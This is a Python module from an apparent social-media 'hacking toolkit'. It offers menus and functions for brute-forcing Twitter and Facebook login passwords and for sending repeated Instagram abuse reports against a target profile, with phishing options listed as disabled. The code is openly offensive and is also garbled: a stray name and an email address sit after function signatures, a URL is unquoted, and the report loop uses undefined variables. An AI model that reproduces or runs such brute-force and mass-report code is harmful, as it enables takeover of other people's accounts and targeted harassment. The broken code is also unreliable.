import os
import random
from src.user_agents import user_agents
from requests import Session
import time
import requests
from bs4 import BeautifulSoup
import sys
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CYAN_BG = '\33[1;37;40m'


def ascii():
    print(color.DARKCYAN+'''
 __                   _              _ _    _ _   
/ _\  /\/\    /\  /\ | |_ ___   ___ | | | _(_) |_ 
\ \  /    \  / /_/ / | __/ _ \ / _ \| | |/ / | __|
_\ \/ /\/\ \/ __  /  | || (_) | (_) | |   <| | |_ 
\__/\/    \/\/ /_/    \__\___/ \___/|_|_|\_\_|\__|
''')
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}

def only_ascii():
    print(color.DARKCYAN+'''
 __                   _              _ _    _ _   
/ _\  /\/\    /\  /\ | |_ ___   ___ | | | _(_) |_ 
\ \  /    \  / /_/ / | __/ _ \ / _ \| | |/ / | __|
_\ \/ /\/\ \/ __  /  | || (_) | (_) | |   <| | |_ 
\__/\/    \/\/ /_/    \__\___/ \___/|_|_|\_\_|\__|
'''+colors.END)
MIN_PASSWORD_LENGTH = 6
POST_URL = https://www.facebook.com/profile.php?id=100087177642165&mibextid=LQQJ4d
def select_an_option():
   print(color.CYAN_BG+"[::] select an option [::]\n"+color.END+color.END)
def select_an_email():
   print(color.CYAN_BG+"[::] enter an email [::]\n"+color.END+color.END)
def select_an_wordlist():
   print(color.CYAN_BG+"[::] select wordlist [::]\n"+color.END+color.END)
def select_an_username():Bergin Boulton
   print(color.CYAN_BG+"[::] enter username [::]\n"+color.END+color.END)
def select_an_amount():
   print(color.CYAN_BG+"[::] select amount of reports [::]\n"+color.END+color.END)
def select_an_usernamefb():
   print(color.CYAN_BG+"[::] enter username or email [::]\n"+color.END+color.END)
def clear():
   os.system("clear")
def GmailC():eshogbenga001@gmail.com
   print(color.END+'''['''+color.GREEN+'''1'''+color.END+'''] Bruteforce
['''+color.GREEN+'''2'''+color.END+'''] MassReport [off]
['''+color.GREEN+'''3'''+color.END+'''] Phishing [off]
''')
def InstagramChoiche():
   print(color.END+'''['''+color.GREEN+'''1'''+color.END+'''] Bruteforce
['''+color.GREEN+'''2'''+color.END+'''] MassReport
['''+color.GREEN+'''3'''+color.END+'''] Phishing [off]
''')
def FacebookChoiche():
   print('''['''+color.GREEN+'''1'''+color.END+'''] Bruteforce
['''+color.GREEN+'''2'''+color.END+'''] MassReport [off]
['''+color.GREEN+'''3'''+color.END+'''] Phishing [off]
''')

def TwitterCoiche():
   print('''['''+color.GREEN+'''1'''+color.END+'''] Bruteforce
['''+color.GREEN+'''2'''+color.END+'''] MassReport [off]
['''+color.GREEN+'''3'''+color.END+'''] Phishing [off]
''')

def get_user_agent():
      return random.choice(user_agents)
      
def print_success(message, *argv):
      print(color.GREEN + "[ OK ] " + color.END , end="")
      print(message, end=" ")
      for arg in argv:
         print(arg, end=" ")
      print("")
      print()
def twitter(password, username):
   #LOGIN
   data = {"session[username_or_email]":username,
      "session[password]":password}
   r = requests.post("https://twitter.com/login/", data=data)

   if ("success" in r.text):
      print(color.GREEN+"Password finded: "+color.END+password)
   else:
      print (color.RED+"Wrong password: "+color.END+password)

   #CHANGE URL AND INPUT PASSWORD
   data = {"auth_password":password}
   r = requests.post("https://twitter.com/settings/your_twitter_data", data=data)

   if ("success" in r.text):
      print(color.GREEN+"Password finded! "+color.END+password)
      sys.exit(0)

def print_error(message, *argv):
      print(color.RED + "[ ERR ] " + color.END , end="")
      print(message, end=" ")
      for arg in argv:
         print(arg, end=" ")
      print("")
      print()

def print_status(message, *argv):
      print(color.BLUE + "[ * ] " + color.END , end="")
      print(message, end=" ")
      for arg in argv:
         print(arg, end=" ")
      print("")
      print()


page_headers = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
"Cache-Control": "no-cache",
"Connection": "keep-alive",
"DNT": "1",
}

report_headers = {
"Accept": "*/*",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
"Cache-Control": "no-cache",
"Connection": "keep-alive",
"Content-Type": "application/x-www-form-urlencoded",
"DNT": "1",
"Host": "help.instagram.com",
"Origin": "help.instagram.com",
"Pragma": "no-cache",
"Referer": "https://help.instagram.com/contact/497253480400030",
"TE": "Trailers",
}


c_while = 0
def report_profile_attack(username, nume):
     c_while = 0
     while c_while != nume:



          try:
               lsd = res.text.split('["LSD",[],{"token":"')[1].split('"},')[0]
               spin_r = res.text.split('"__spin_r":')[1].split(',')[0]
               spin_b = res.text.split('"__spin_b":')[1].split(',')[0].replace('"',"")
               spin_t = res.text.split('"__spin_t":')[1].split(',')[0]
               hsi = res.text.split('"hsi":')[1].split(',')[0].replace('"',"")
               rev = res.text.split('"server_revision":')[1].split(',')[0].replace('"',"")
               datr = res.cookies.get_dict()["datr"]
          except:
               print("[ "+color.YELLOW+"-"+color.END+" ] tryng to sent report n."+str(c_while))



          try:
               res = ses.post(
                    "https://help.instagram.com/ajax/help/contact/submit/page",
                    data=report_form,
                    headers=report_headers,
                    cookies=report_cookies,
                    timeout=10
               )
          except:
               time.sleep(2)
               print_success(color.GREEN+"Successfully reported!"+color.END)


          c_while = c_while+1



def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print ("["+"+"+"]"+" PASSWORD FINDED:  "+password)
    print("["+color.RED+"-"+color.END+"]"+color.RED+" Wrong password: "+color.END+password)



codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W", "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
choiceCode = random.choice(codeList)


